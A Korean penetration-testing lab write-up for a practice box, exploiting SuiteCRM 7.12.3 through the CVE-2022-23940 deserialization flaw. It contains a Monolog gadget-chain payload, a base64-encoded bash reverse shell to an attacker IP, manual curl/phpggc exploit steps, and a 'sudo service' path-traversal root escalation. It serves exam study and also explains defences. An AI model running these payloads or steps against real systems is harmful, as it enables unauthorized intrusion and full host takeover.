| ② 중간 | OS 명령 문자열: `echo <b64> \| base64 -d \| bash` | 가젯 체인이 최종적으로 `system()`에 넘길 인자 |
| ① 안쪽 | `bash -i >& /dev/tcp/192.168.45.207/4444 0>&1` 를 **base64로 인코딩** | 리버스셸 원문에 `&`·`>`가 섞여 있어 중간 경로에서 깨진다 |

**이 박스에서 실제로 날아간 페이로드가 디스크에 있다.** `~/PG/Crane/CVE-2022-23940/exploit.py`의 `payload_template_start/second/third` 세 상수가 그것이다. 추측할 필요 없이 그대로 읽으면 된다 — 골격만 남기고 정리하면:

```
a:2:{ i:7;
  O:32:"Monolog\Handler\SyslogUdpHandler":1:{           ← ★ 최상위 = 진입점
    s:6:"socket";
    O:29:"Monolog\Handler\BufferHandler":7:{            ← 바깥 BufferHandler
      s:10:"\0*\0handler";
      O:29:"Monolog\Handler\BufferHandler":7:{          ← 안쪽 BufferHandler
        s:10:"\0*\0handler";      N;
        s:13:"\0*\0bufferSize";   i:-1;
        s:9:"\0*\0buffer";        a:1:{i:0;a:2:{i:0; s:<len>:"<OS 명령>"; s:5:"level";N;}}
        s:8:"\0*\0level";         N;
        s:14:"\0*\0initialized";  b:1;
        s:14:"\0*\0bufferLimit";  i:-1;
        s:13:"\0*\0processors";   a:2:{i:0;s:7:"current"; i:1;s:6:"system";}   ← ★ 발화
      }
      … 바깥 BufferHandler도 buffer/processors를 동일하게 갖는다 …
    }
  }
  i:7;i:7; }
```

> [!danger] 최상위는 `BufferHandler`가 아니라 `SyslogUdpHandler`다
> 이 노트는 원래 `BufferHandler::__destruct()`를 진입점으로 그려놨었다. **틀렸다** — 그건 `Monolog/RCE1` 계열의 모양이다.
> phpggc의 `gadgetchains/Monolog/RCE/2/chain.php`는 `$vector = '__destruct'` 로 두고 **`SyslogUdpHandler`를 최상위**에 놓은 뒤 그 `$socket` 프로퍼티에 `BufferHandler`를 담는다. 디스크의 `exploit.py` 페이로드가 정확히 그 모양이다(`O:32:"...SyslogUdpHandler":1:{s:6:"socket";O:29:"...BufferHandler"…`).
> **교훈: 가젯 체인의 모양을 기억으로 쓰지 마라.** phpggc는 같은 라이브러리에 RCE1/RCE2/RCE3…를 두고 **체인마다 진입 클래스가 다르다.** PoC가 디스크에 있으면 그것이 1차 사료다.

호출이 굴러가는 흐름 `[가정 — 클래스 골격은 위 페이로드로 확정했으나, 아래 메서드 이름과 내부 분기는 Monolog 소스를 이 박스에서 직접 열어 확인하지는 않았다]`:

```
SyslogUdpHandler::__destruct()
   └ close()
        └ $this->socket->close()          ← socket 자리에 BufferHandler가 들어 있다
             └ BufferHandler::flush()      버퍼에 남은 레코드를 다음 핸들러로 밀어낸다
                  └ 안쪽 BufferHandler::handle($record)
                       └ foreach ($this->processors as $processor)
                             $record = $processor($record);        ← ★ 발화 지점
```

| 체인 조각 | 공격자가 심는 값 | 역할 |
|---|---|---|
| `SyslogUdpHandler` | **최상위 객체** | **`__destruct`를 가진 진입점.** 아무것도 안 해도 요청 끝에 자동 실행 |
| `$socket` | `BufferHandler` 객체 | `SyslogUdpHandler`가 "소켓을 닫는다"고 믿고 `close()`를 부르는 자리. **타입이 검사되지 않으므로 아무 객체나 넣을 수 있다** — 이것이 가젯 연결의 정체다 |
| `$buffer` | `[[<OS 명령 문자열>, 'level' => null]]` | **레코드 배열 1개.** 안쪽 원소 하나가 명령 문자열이다. `['<명령>']` 같은 평평한 배열이 아니라 **한 겹 더 감싸인 형태**라는 점이 중요하다 — 그래서 `current()`가 필요해진다 |
| `$bufferLimit` / `$bufferSize` / `$initialized` | `-1` / `-1` / `true` | 플러시가 실제로 일어나도록 맞춘 값. 틀리면 `flush()`가 조기 반환해 **체인이 조용히 죽는다** |
| `$processors` | `['current', 'system']` | 핵심. `current($record)`가 배열의 첫 원소(=명령 문자열)를 꺼내고, 그 반환값이 **다음 반복에서 `system()`의 인자**가 된다 |
| `$level` | `N`(null) | `$record['level'] < $this->level` 조기 반환을 피하기 위한 값 |

> [!note] `['current', 'system']`이 왜 두 개인가
> `call_user_func($processor, $record)`의 `$record`는 **배열**이다. `system(배열)`은 실패한다.
> 그래서 첫 반복에서 `current()`로 **배열 → 문자열**로 바꾸고, 그 결과가 `$record`에 재대입되어 두 번째 반복에서 `system('명령')`이 된다.
> **가젯 체인 설계의 전형적인 기교** — 타입이 안 맞는 지점을 표준 함수 하나로 변환해서 통과시킨다. `current`·`array_pop`·`reset`·`end`가 이 역할에 자주 쓰인다.

이제 실제로 던진 명령 문자열을 조각내면:

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE= | base64 -d | bash
```

| 조각 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `echo <base64>` | 인코딩된 리버스셸을 stdout으로 | — |
| `\| base64 -d` | 디코드해서 원래 bash 한 줄로 복원 | 인코딩 없이 원문을 그대로 넣으면 `>`·`&`가 **셸/HTTP 파라미터 경계에서 깨진다** |
| `\| bash` | 복원된 명령을 실행 | `sh`로 넘기면 실패한다 — 아래 참조 |

그리고 그 안쪽의 리버스셸:

| 조각 | 역할 |
|---|---|
| `bash -i` | **대화형** 셸. 없으면 프롬프트가 안 뜨고 입력이 안 먹는다 |
| `>& /dev/tcp/192.168.45.207/4444` | stdout+stderr를 **TCP 소켓으로 리다이렉트**. `/dev/tcp`는 실제 파일이 아니라 **bash 내장 가상 장치**다 |
| `0>&1` | stdin을 같은 소켓에 연결 → 양방향 완성 |

> [!danger] `/dev/tcp`는 bash 전용이다 — `sh`로는 안 된다. **그런데 실패하는 층이 둘이다**
> `/bin/sh`가 dash인 데비안 계열에서 실제로 무엇이 나오는지 **Kali에서 때려봤다**:
>
> ```
> $ /bin/sh -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1'
> /bin/sh: 1: Syntax error: Bad fd number          (rc=2)
>
> $ dash -c 'echo hi > /dev/tcp/127.0.0.1/9'
> dash: 1: cannot create /dev/tcp/127.0.0.1/9: Directory nonexistent   (rc=2)
> ```
>
> **두 실패는 층이 다르다 — 이 구분이 디버깅의 전부다:**
>
> | 층 | 무엇이 죽는가 | 증상 |
> |---|---|---|
> | **① 문법 파싱** | dash에서 `>&`는 **fd 복제 전용**이라 `/dev/tcp/...` 같은 파일명을 받지 못한다 | `Syntax error: Bad fd number` — **`/dev/tcp`에 도달조차 못 한다** |
> | **② 가상 장치 부재** | `>` 하나로 바꿔 문법을 통과시켜도, dash에는 `/dev/tcp` **가상 장치 자체가 없다**(bash가 리다이렉션을 가로채 소켓을 여는 기능이지 실제 파일이 아니다) | `cannot create /dev/tcp/...: Directory nonexistent` |
>
> ⚠️ 이 노트는 원래 **`/dev/tcp: No such file or directory`** 라고 적어놨었다. **그 문자열은 어느 경우에도 나오지 않는다.** 그럴듯하지만 실행해본 적 없는 문구였고, 인과도 뒤집혀 있었다(파싱에서 먼저 죽는데 장치 부재를 원인으로 적었다).
>
> **결론은 그대로다** — 마지막 파이프가 반드시 **`| bash`** 여야 한다. `system()`이 내부적으로 `/bin/sh -c`를 쓰기 때문에, **`bash`로 명시적으로 넘기는 이 한 겹이 없으면 셸이 안 붙는다.**
> 리버스셸이 안 붙을 때 의심 순서: ① 아웃바운드 포트 차단 → ② **`sh` vs `bash`** → ③ `/dev/tcp` 미지원 빌드(`--disable-net-redirections`로 컴파일된 bash) → ④ IP/포트 오타. ②가 가장 흔하고 가장 늦게 발견된다.
>
> **일반화: 에러 문구를 기억으로 쓰지 말고 한 번 때려보고 적어라.** 문구가 다르면 검색어가 달라지고, 검색어가 다르면 시험장에서 10분이 날아간다.

### 2-4. 일반화 — 역직렬화 취약점의 지문을 알아보는 법

CVE-2022-23940 자체는 두 번 다시 안 나온다. 다시 나오는 것은 **패턴**이다. 아래 신호 중 하나라도 보이면 역직렬화를 의심한다.

| 신호 | 어디서 보이는가 | 판단 |
|---|---|---|
| 파라미터·쿠키 값이 **`O:`/`a:`/`s:`로 시작** | `Cookie: user=O:4:"User":2:{...}` | **PHP 직렬화 원문 그대로**. 즉시 POP 체인 시도 |
| base64 디코드했더니 위 형태 | 폼 필드·쿠키·`state`·`data` 파라미터 | 이 박스의 `email_recipients`가 정확히 이 경우 |
| base64가 **`rO0AB`** 로 시작 | Java 앱 | **Java 직렬화 매직바이트 `AC ED 00 05`.** ysoserial 대상 |
| base64가 **`gASV`/`gAJ`** 로 시작 | Python 앱 | **pickle 프로토콜 헤더.** `__reduce__` 페이로드 |
| `AAEAAAD/////` | .NET 앱 | `BinaryFormatter`. ysoserial.net 대상 |
| 소스에 `unserialize(`·`readObject(`·`pickle.loads(`·`Marshal.load(`·`yaml.load(` | 화이트박스 리뷰 | **사용자 입력이 여기 닿는지**만 추적하면 끝 |
| `vendor/monolog`·`vendor/guzzlehttp`·`vendor/symfony` 디렉터리 노출 | 디렉터리 브루트포스 결과 | 가젯 공급원이 있다는 뜻. phpggc 대상 라이브러리 목록과 대조 |

> [!tip] 확인 순서 — 파괴하지 말고 관측부터
> 1. **파싱되는지 확인** — 값을 한 글자 망가뜨려 보낸다. 500이나 다른 에러가 나면 **서버가 실제로 역직렬화하고 있다**는 증거다
> 2. **체인이 사는지 확인** — RCE 대신 `sleep 10`. 응답이 10초 늦으면 성공
> 3. **그다음에 셸** — 순서를 지키면 "체인 문제 / 네트워크 문제"를 분리할 수 있다
>
> 1번을 건너뛰고 바로 셸을 던지면, 안 붙었을 때 **원인 후보가 다섯 개로 늘어난다.** 한 번에 하나씩만 바꾼다.

> [!danger] 방어자가 흔히 하는 착각 — 그래서 공격자에게 기회가 된다
> *"직렬화 문자열을 암호화/인코딩했으니 안전하다"* → **base64는 인코딩이지 보호가 아니다.** 누구나 디코드하고 재인코딩한다.
> *"우리 코드에는 위험한 클래스가 없다"* → 가젯은 **`vendor/` 안**에서 나온다.
> *"클래스명을 화이트리스트로 검사한다"* → `allowed_classes`를 지정하지 않은 `unserialize()`는 **파싱 시점에 이미 객체를 만든다.** 검사는 그 뒤다.
> **유일하게 확실한 방어는 사용자 데이터를 역직렬화하지 않는 것**이다 — 8장의 첫 줄이 그래서 그렇게 쓰여 있다.

---

## 3. Foothold

### 3-1. 기본 자격증명 확인 — CVE보다 먼저

CVE를 태우기 전에 로그인부터 확인한다. SuiteCRM 로그인 폼에는 `csrf_token`이 없어서 curl 한 방으로 검증된다.

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ curl -sS -i -X POST 'http://192.168.248.146/index.php' \
    -d 'module=Users&action=Authenticate&user_name=admin&username_password=admin&Login=Log+In'
HTTP/1.1 302 Found
Location: index.php?module=Home&action=index
```

`302 → module=Home` = 인증 성공. **admin:admin** 성립.

> [!tip] 플래그 해설 — 왜 `-i`가 결정적인가
> | 플래그 | 역할 | 빼면 |
> |---|---|---|
> | `-i` | **응답 헤더를 출력** | 본문만 본다. 이 로그인은 **본문이 아니라 `Location:` 헤더로 성공/실패가 갈린다** — `-i` 없이는 판정 자체가 불가능 |
> | `-sS` | 진행률 막대는 끄고 에러는 보이기 | `-s`만 쓰면 연결 실패도 조용히 지나간다 |
> | `-L` **미사용** | 리다이렉트를 **따라가지 않는다** | `-L`을 붙이면 302를 따라가버려 최종 200만 보인다. **판정 신호인 302가 사라진다** |
>
> **로그인 성공/실패 판정은 상태코드+`Location` 헤더로 한다.** 실패 시 SuiteCRM은 `Location: index.php?module=Users&action=Login&loginErrorMessage=...` 로 되돌린다. 200 본문 길이 비교보다 훨씬 확실하다.
> 이것도 **"응답이 성공을 뜻하지 않는다"** 패턴이다 — 200이 성공이 아니고, 302가 실패가 아니다. **어디로 보내는지**를 봐야 한다.

### 3-2. CVE-2022-23940 발사

리스너를 tmux 세션으로 띄운다 (비대화식 SSH로 몰 때 셸이 안 끊긴다):

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ tmux new-session -d -s crane 'rlwrap nc -lvnp 4444'
```

> [!tip] `tmux` + `rlwrap`을 습관으로
> - `tmux new-session -d -s <이름> '<명령>'` — **-d(detached)** 로 백그라운드 실행. 터미널을 닫아도 리스너가 산다
> - `rlwrap` — readline 래핑. **방향키·↑히스토리·백스페이스**가 raw 리버스셸에서도 동작한다. 없으면 오타 하나에 명령을 통째로 다시 쳐야 한다
> - `nc -lvnp 4444` — `l`isten · `v`erbose · `n`o-DNS · `p`ort. **`-n`을 빼면 역방향 DNS 조회로 접속 표시가 수 초 지연**된다

페이로드를 base64로 감싼다 (익스플로잇 인자에 `&`, `>` 가 섞이면 깨지므로):

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ echo -n 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE=
```

> [!warning] `-n`과 `-w0`을 빼면 조용히 깨진다
> | 플래그 | 역할 | 빼면 |
> |---|---|---|
> | `echo -n` | **후행 개행 제거** | 개행이 base64에 포함되어 디코드 결과 끝에 `\n`이 붙는다. 대개 무해하지만 명령을 셸 인자로 재조립할 때 문제가 된다 |
> | `base64 -w0` | **줄바꿈 없이 한 줄로** | 기본값은 **76자마다 줄바꿈**이다. 여러 줄이 된 base64를 HTTP 파라미터에 넣으면 잘려나가 디코드가 실패한다. **`-w0`은 선택이 아니라 필수** |

익스플로잇 실행:

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ git clone https://github.com/manuelz120/CVE-2022-23940.git
┌──(kali㉿kali)-[~/PG/Crane/CVE-2022-23940]
└─$ python3 exploit.py -h http://192.168.248.146 -u admin -p admin \
    -P 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE= | base64 -d | bash'
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
```

> [!tip] 시험 관점 — 공개 PoC 스크립트는 **허용된다**. 다만 손으로 재구성할 줄 알아야 한다
> 이 노트는 원래 `exploit.py`를 "OSCP 자동 익스플로잇 도구 금지에 걸릴 소지"로 적어놨었다. **과잉 해석이었다.** OffSec의 금지 정의는 이렇다:
>
> > *"if a tool is capable of **automatically discovering and exploiting** vulnerabilities on a target machine resulting in automatic remote access … **without effort or enumeration**"* — 열거된 예: `db_autopwn` · `browser_autopwn` · **SQLmap** · **SQLninja**
>
> 핵심은 **"스스로 발견(discovering)까지 한다"** 이다. **특정 CVE 한 건을 겨냥한 공개 PoC는 취약점을 발견하지 않는다** — 어느 CVE인지, 어느 엔드포인트인지를 **네가 열거해서 정해준** 뒤에야 동작한다. 그래서 정의에 들어가지 않는다.
> 애초에 **OSCP는 exploit-db·GitHub 익스플로잇 사용을 전제로 설계된 시험**이다. `searchsploit`이 기본 탑재돼 있는 이유가 그것이다.
>
> **그러니 판단은 "금지냐"가 아니라 "스크립트가 죽으면 이어갈 수 있느냐"다.**
> 공개 PoC는 버전이 조금만 달라도, 폼 필드가 하나만 바뀌어도 조용히 실패한다. 그때 살아남는 유일한 방법이 수동 절차다.

> [!abstract] 수동 대안 — `exploit.py` 소스에서 그대로 환원했다
> ⚠️ **아래는 미실행 절차다.** 이 박스에서는 `exploit.py`로 풀었고 타겟은 이미 정지됐다. **출력은 기록하지 않는다.**
> 단 필드 구성은 추측이 아니라 **`~/PG/Crane/CVE-2022-23940/exploit.py` 소스에서 읽어낸 것**이다.
>
> ```bash
> # ① 세션 확보 — PHPSESSID 저장
> curl -sS -c cookies.txt -X POST 'http://TARGET/index.php' \
>   -d 'module=Users&action=Authenticate&user_name=admin&username_password=admin'
>
> # ② 페이로드 생성 (base64 출력)
> phpggc Monolog/RCE2 system 'echo <b64> | base64 -d | bash' -b
>
> # ③ 전송 — 필수 필드 전량 + Referer
> curl -sS -b cookies.txt -X POST 'http://TARGET/index.php' \
>   -H 'Referer: http://TARGET' \
>   --data-urlencode 'module=AOR_Scheduled_Reports' \
>   --data-urlencode 'action=Save' \
>   --data-urlencode 'name=test' \
>   --data-urlencode 'status=active' \
>   --data-urlencode 'schedule_type=monthly' \
>   --data-urlencode 'email_recipients=<② 출력>'
>
> # ④ (필요시) 트리거 — 응답의 record_id='...' 를 뽑아 run
> curl -sS -b cookies.txt \
>   'http://TARGET/index.php?module=AOR_Scheduled_Reports&action=run&record=<record_id>'
>
> # ⑤ 리스너 확인
> ```
>
> > [!danger] `name`·`status`·`schedule_type`을 빼면 레코드 생성이 실패한다
> > 이 노트는 원래 `module`·`action`·`email_recipients` **3개만** 적어놨었고, 그대로 따라 하면 재현이 안 된다.
> > `exploit.py`가 실제로 보내는 것은 **6개 필드 + `Referer` 헤더**다. `Referer`는 SuiteCRM의 요청 출처 검사를 통과하기 위한 것이다.
> > 원래 있던 "폼 필드명은 실제 저장 폼을 브라우저로 열어 확인해야 한다"는 문장도 **삭제했다** — **PoC 소스에 이미 다 있다.** 브라우저를 켜기 전에 `exploit.py`를 열어라.
>
> **③에서 이미 셸이 붙는다.** Save 응답을 렌더하면서 서버가 방금 저장한 레코드를 다시 읽고, 그 조회 경로가 `get_email_recipients()` → `unserialize()` 이기 때문이다(2-2 참조). ④의 `action=run`까지 갈 필요조차 없다 — 6장 ②의 "행 착시"가 정확히 이것이다.
>
> **원칙: PoC를 쓰더라도 소스를 열어 "어떤 HTTP 요청을 보내는가"를 읽어라.** 그것이 곧 수동 절차이고, 스크립트가 실패했을 때 디버깅할 수 있는 유일한 방법이다.

> [!warning] 여기서 멈춘 것처럼 보인다 — 실패가 아니다
> 스크립트가 `Trying to create scheduled report`에서 그대로 굳고 결국 타임아웃된다.
> **역직렬화가 `Save` POST 처리 도중 인라인으로 발화**해서 리버스셸이 그 요청 안에서 붙어버리고, 그래서 HTTP 응답이 영영 반환되지 않기 때문이다.
> 스크립트 마지막의 `action=run` 트리거까지 갈 필요조차 없다. **스크립트가 아니라 리스너를 봐라.**

```bash
┌──(kali㉿kali)-[~/PG/Crane]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.146] 36438
bash: cannot set terminal process group (610): Inappropriate ioctl for device
bash: no job control in this shell
www-data@crane:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@crane:/var/www/html$ export TERM=xterm
www-data@crane:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@crane:/var/www/html$ uname -a
Linux crane 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64 GNU/Linux
```

> [!note] TTY 업그레이드 3단 세트
> ```bash
> python3 -c "import pty;pty.spawn('/bin/bash')"   # ① 의사 터미널 확보
> export TERM=xterm                                 # ② clear/vim/less가 동작
> # (선택) Ctrl+Z → stty raw -echo; fg → 탭완성·Ctrl+C 정상화
> ```
> `bash: cannot set terminal process group ... no job control` 메시지가 **TTY가 없다는 증거**다. 이게 보이면 위 3단을 반사적으로 친다.
> `python3`가 없는 박스라면 `script -qc /bin/bash /dev/null` — [[Hawat]]에서 실제로 그랬다.

---

## 4. 권한상승

### 4-1. 열거 — 셸 잡자마자 치는 5개

셸을 얻은 직후의 고정 루틴은 이렇다. 이 박스는 **두 번째 줄에서 끝났다**:

```
id                              # 소속 그룹 (docker/lxd/disk/adm이면 즉시 승부)
sudo -l                         # ← 이 박스의 정답
find / -perm -4000 -type f 2>/dev/null   # SUID
getcap -r / 2>/dev/null         # capabilities
cat /etc/crontab; ls -la /etc/cron.*     # 크론
```

```bash
www-data@crane:/var/www/html$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
```

> [!note] 이 출력을 읽는 법
> | 줄 | 의미 |
> |---|---|
> | `(ALL) NOPASSWD: /usr/sbin/service` | **모든 사용자로**(=root 포함) **비밀번호 없이** `service`를 실행할 수 있다. `www-data`의 비밀번호를 모르는 상황에서 `NOPASSWD`는 결정적이다 |
> | `env_reset` | 환경변수가 초기화된다 → **`LD_PRELOAD`·`LD_LIBRARY_PATH` 트릭은 봉쇄** |
> | `secure_path=...` | `PATH`가 고정된다 → **PATH 하이재킹도 봉쇄** |
> | 인자 제한이 **없다** | `/usr/sbin/service ""` 같은 인자 제약이 걸려 있지 않다. **인자를 자유롭게 줄 수 있다는 것이 이 취약점의 전부**다 |
>
> `env_reset`과 `secure_path`가 보이면 "환경변수 계열은 죽었다"고 판단하고 **곧바로 GTFOBins**로 간다. 시간을 아끼는 판단이다.

### 4-2. 왜 `service`가 권한상승이 되는가 — 경로 이어붙이기

`service`는 인자로 받은 서비스명을 `/etc/init.d/<이름>` 으로 이어붙여 실행한다. 이름에 상대경로를 넣으면 `/etc/init.d/` 밖으로 탈출해 임의 바이너리를 root로 띄울 수 있다 (GTFOBins `service`).

메커니즘을 코드 수준으로 보면 — `/usr/sbin/service`는 컴파일된 바이너리가 아니라 **셸 스크립트**다(데비안/Kali의 `init-system-helpers` 패키지). Kali에서 그대로 뽑은 원문은 이렇다:

```sh
SERVICEDIR="/etc/init.d"                                   # 49행 부근
...
run_via_sysvinit() {                                       # 134행 부근
   # Otherwise, use the traditional sysvinit
   if [ -x "${SERVICEDIR}/${SERVICE}" ]; then
      exec env -i LANG="$LANG" … LC_ALL="$LC_ALL" PATH="$PATH" TERM="$TERM" \
           "$SERVICEDIR/$SERVICE" ${ACTION} ${OPTIONS}     # ← 문자열 연결 후 그대로 exec
   else
      echo "${SERVICE}: unrecognized service" >&2
      exit 1
   fi
}
```

읽어야 할 것이 셋이다:

| 조각 | 의미 |
|---|---|
| `"$SERVICEDIR/$SERVICE"` | **인용은 돼 있다.** 그래서 공백·세미콜론으로 명령을 주입하는 것은 안 된다. 뚫리는 것은 오직 **경로 구분자 `/`를 안 거른다**는 점 하나다 |
| `if [ -x ... ]` 가드 | **실행 비트가 있는 파일만** 통과한다. 그래서 아무 파일이나 되는 게 아니라 `/bin/bash`처럼 **실행 가능한 것**을 골라야 한다. 통과 못 하면 `unrecognized service`가 뜬다 — 이 메시지가 보이면 경로가 틀렸거나 대상이 실행 불가라는 뜻 |
| **`exec env -i …`** | 환경변수를 **로케일·`PATH`·`TERM`만 남기고 통째로 비운다** |

> [!note] `env -i`는 4-1의 `env_reset`보다 **더 강한 봉쇄**다
> `sudo`의 `env_reset`은 sudo가 환경을 정리하는 단계이고, `service`의 `env -i`는 **그 뒤에 한 번 더** 비운다.
> 즉 `LD_PRELOAD`·`LD_LIBRARY_PATH`·`IFS`·`BASH_ENV` 계열 트릭은 **두 겹으로 막혀 있다.** `sudo -l`에 `env_reset`이 안 보이더라도 `service`를 경유하면 여전히 안 통한다는 뜻이다.
> **그래서 이 프로그램에서 남는 공격면은 "인자가 경로에 이어붙는다" 하나뿐**이고, 정확히 그것이 GTFOBins에 오른 이유다.

`${SERVICE}`가 **경로 구분자 `/`를 걸러내지 않는다.** 그래서:

| 입력 | 이어붙인 결과 | 실행되는 것 |
|---|---|---|
| `apache2` | `/etc/init.d/apache2` | 정상 동작 |
| `../../bin/bash` | `/etc/init.d/../../bin/bash` | **`/bin/bash`** |
| `../../../../../bin/bash` | `/etc/init.d/../../../../../bin/bash` | **`/bin/bash`** (동일) |

```bash
www-data@crane:/var/www/html$ sudo /usr/sbin/service ../../../../../bin/bash
root@crane:/# id
uid=0(root) gid=0(root) groups=0(root)
root@crane:/# cat /root/proof.txt
f92c362a87099978dbf8f3f108147934
```

`../../../../../bin/bash` → `/etc/init.d/../../../../../bin/bash` = `/bin/bash`. 상위 이동이 루트를 넘어가도 `/`에서 흡수되므로 개수는 넉넉히 넣으면 된다.

> [!tip] 왜 `..`를 넉넉히 넣어도 되는가 — 그리고 일반화
> 커널의 경로 해석에서 **`/..`는 `/`** 다. 루트보다 위는 없으므로 초과분이 조용히 흡수된다.
> 따라서 **정확한 깊이를 셀 필요가 없다.** 이건 디렉터리 트래버설(`../../../etc/passwd`)에서도 똑같이 쓰는 성질이다 — 세는 대신 **넉넉히 넣는 것이 정답**이다.
>
> **일반화된 신호**: `sudo -l`에 걸린 프로그램이 **인자를 경로에 이어붙이거나, 셸을 띄우거나, 파일을 읽고 쓰거나, 외부 명령을 부르면** 거의 예외 없이 권한상승이 된다.
> 반사적으로 확인할 것: `service`·`tar`(`--checkpoint-action=exec`)·`zip`(`-T -TT`)·`awk`·`find`(`-exec`)·`vim`/`less`/`man`(`!sh`)·`git`(`-p` 페이저)·`env`·`nmap`(구버전 `--interactive`)·`docker`·`systemctl`.
> **GTFOBins(https://gtfobins.github.io)에서 프로그램명을 검색하는 데 10초**면 된다. `sudo -l` 결과가 나오는 즉시 그렇게 한다.

### 4-3. 다른 경로는 없었는가

이 박스는 `sudo service` 하나로 끝나므로 대안 경로를 팔 필요가 없었다. 다만 **foothold를 못 잡았을 때의 백업 경로**로 아래를 기억해둔다 (root 획득 후 수집한 정보):

```bash
root@crane:/# grep suitecrm_version /var/www/html/suitecrm_version.php
$suitecrm_version = '7.12.3';

root@crane:/# grep -A8 dbconfig /var/www/html/config.php
  'dbconfig' =>
  array (
    'db_host_name' => 'localhost',
    'db_host_instance' => 'SQLEXPRESS',
    'db_user_name' => 'root',
    'db_password' => '',
    'db_name' => 'suitecrm',
    'db_type' => 'mysql',
```

DB가 `root` / 빈 패스워드지만 이미 시스템 root라 추가 활용은 불필요. (foothold를 못 잡았을 때의 대체 경로로 기억해둘 것)

> [!warning] 이 자격증명은 외부에서 못 쓴다
> nmap이 `3306/tcp MySQL (unauthorized)`를 낸 직접 원인은 **내 접속 호스트가 `mysql.user`의 어떤 `user@host` 행과도 매칭되지 않았다**는 것이다.
> `root@localhost`만 존재했을 가능성이 높지만 `[가정]` — **`SELECT user,host FROM mysql.user`를 조회하지는 않았다.** `config.php`의 `db_host_name => 'localhost'`는 **앱이 접속하는 주소**일 뿐 서버측 호스트 ACL이 아니다. 둘을 같은 것으로 읽으면 안 된다.
> (1장 nmap 해설표는 이 구분을 지켜 "내 IP가 `mysql.user` 호스트 목록에 없다"로 써놨다. 여기서 "`localhost`에서만 붙는다"로 단정했던 것을 되돌린 것이다.)
> **DB 자격증명을 얻었는데 원격 접속이 거부되면** ① 호스트 제한(`user@localhost`) ② bind-address 를 의심하고, **SSH 포트포워딩(`ssh -L 3306:127.0.0.1:3306`)이나 이미 잡은 웹셸을 경유**한다.
> 반대로 이 값의 진짜 가치는 **패스워드 재사용**이다 — 여기서 얻은 비밀번호로 SSH·다른 서비스를 다시 시도하는 것이 정석이다. (이 박스는 빈 문자열이라 무의미)

---

## 5. 플래그

### user 플래그 — `/home`이 비어 있다

```bash
www-data@crane:/var/www/html$ ls -la /home/
total 8
drwxr-xr-x  2 root root 4096 Jun  6  2023 .
drwxr-xr-x 18 root root 4096 Jun 13  2023 ..

www-data@crane:/var/www/html$ find / -name local.txt 2>/dev/null
/var/www/local.txt

www-data@crane:/var/www/html$ cat /var/www/local.txt
dd091466af4faca653da308c6d836aa1
```

> [!tip] `/home`이 비었다고 당황하지 말 것
> 일반 유저 계정 없이 서비스 계정만 있는 박스에서는 플래그가 **서비스 홈 디렉터리**(`/var/www`)에 놓인다. `find / -name local.txt 2>/dev/null`을 반사적으로 친다.

`2>/dev/null`은 **stderr(=권한 없는 디렉터리의 `Permission denied` 수천 줄)를 버린다.** 이걸 빼면 `www-data` 권한으로 `/proc`·`/root`를 훑다가 에러가 화면을 덮어 정작 결과 한 줄을 놓친다. **비특권 셸에서 `find /`를 칠 때는 예외 없이 붙인다.**

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `/var/www/local.txt` (**비표준**) | `dd091466af4faca653da308c6d836aa1` |
| `proof.txt` | `/root/proof.txt` | `f92c362a87099978dbf8f3f108147934` |

> [!tip] 시험 증거 형식 연습
> 실제 시험에서는 플래그를 **`whoami`/`hostname`/`ip a`와 한 화면에** 찍어야 인정된다:
> ```bash
> whoami; hostname; ip a; cat /var/www/local.txt
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스는 `hostname` 바이너리가 있고 프롬프트에도 `crane`이 보이지만, **프롬프트는 증거가 아니다.** 명령 출력으로 남겨야 한다.

---

## 6. 막혔던 지점 / 시행착오

> [!abstract] 이 장의 구분
> **①~④는 이 박스에서 실제로 겪은 것**이다 — 원문 기록에 근거가 남아 있다.
> **⑤~⑨는 이 유형(역직렬화 RCE + sudo GTFOBins)에서 흔히 막히는 지점**으로, **이 박스에서 실제로 겪지는 않았지만** 같은 골격을 다시 만났을 때를 위해 정리해둔 것이다. 각 항목 첫 줄에 이 박스에서의 실제 결과를 괄호로 밝혀둔다. **직접 관찰한 것과 섞어 읽지 말 것.**
> **⑩은 시간 배분**이다.

### ① `searchsploit`이 "익스플로잇 없음"으로 보이게 만들었다 — 실제 겪음

`searchsploit suitecrm` 결과는 **7.10.7 · 7.11.15 · 7.11.18** 세 갈래뿐이었고 타겟은 **7.12.3**이다. 전부 낮은 버전이다.

여기서 판단이 갈린다:
- **잘못된 결론**: "7.12.3용 공개 익스플로잇이 없다 → 웹은 막다른 길 → 다른 포트를 판다"
- **옳은 결론**: "exploit-db에 없을 뿐이다 → **CVE 번호로 다시 검색**"

실제로 `SuiteCRM 7.12.3 CVE`로 검색하면 **CVE-2022-23940**과 GitHub PoC가 바로 나온다. 이 박스에서 **가장 시간을 태울 뻔한 분기점**이 여기였다.

> [!danger] 일반화 — searchsploit은 검색의 시작이지 끝이 아니다
> exploit-db는 **누군가 제출한 것만** 담는다. 2020년 이후의 웹 앱 취약점은 상당수가 **GitHub PoC와 보안 어드바이저리로만** 존재한다.
